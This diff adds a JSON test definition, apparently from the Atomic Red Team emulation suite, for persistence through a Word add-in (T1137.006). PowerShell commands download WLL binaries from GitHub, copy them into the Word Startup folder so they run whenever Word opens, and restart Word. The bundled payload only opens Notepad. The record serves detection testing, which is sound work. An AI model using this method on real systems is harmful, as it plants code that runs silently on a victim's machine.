@@ -1,0 +1,35 @@
+{
+    "name": "Persistent Code Execution Via Word Add-in File (WLL)",
+    "description": "Creates a Word Add-in file (WLL) which runs automatically when Word is started The sample WLL provided launches the notepad as a proof-of-concept for persistent execution from Office. Successfully tested on 32-bit Office 2016. Not successful from microsoft 365 version of Office.  ",
+    "supported_platforms": [
+        "windows"
+    ],
+    "executor": {
+        "name": "powershell",
+        "command": "$wdApp = New-Object -COMObject \"Word.Application\"\nif(-not $wdApp.path.contains(\"Program Files (x86)\"))  \n{\n  Write-Host \"64-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"        \n}\nelse{\n  Write-Host \"32-bit Office\"\n  Copy \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\" \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\"\n}\nStop-Process -Name \"WinWord\" \nStart-Process \"WinWord\"\n",
+        "cleanup_command": "Stop-Process -Name \"notepad\",\"WinWord\" -ErrorAction Ignore\nStart-Sleep 3\nRemove-Item \"$env:APPDATA\\Microsoft\\Word\\Startup\\notepad.wll\" -ErrorAction Ignore\n",
+        "type": "Command Executor"
+    },
+    "id": "T1137.006",
+    "tactics": [
+        "Persistence"
+    ],
+    "technique": "Add-ins",
+    "source": "ART",
+    "uuid": "95408a99-4fa7-4cd6-a7ef-cb65f86351cf",
+    "arguments": null,
+    "preconditions": [
+        {
+            "description": "Microsoft Word must be installed\n",
+            "prereq_command": "try {\n  New-Object -COMObject \"Word.Application\" | Out-Null\n  Stop-Process -Name \"winword\"\n  exit 0\n} catch { exit 1 }\n",
+            "get_prereq_command": "Write-Host \"You will need to install Microsoft Word manually to meet this requirement\"\n"
+        },
+        {
+            "description": "WLL files must exist on disk at specified location",
+            "prereq_command": "if ((Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\") -and (Test-Path \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\")) {exit 0} else {exit 1}\n",
+            "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\\" -Force | Out-Null\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x64.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x64.wll\"\nInvoke-Webrequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1137.006/bin/Addins/wordwll_x86.wll\" -UseBasicParsing -OutFile \"PathToAtomicsFolder\\T1137.006\\bin\\Addins\\wordwll_x86.wll\""
+        }
+    ],
+    "infrastructure_requirement": [],
+    "side": "Victim"
+}
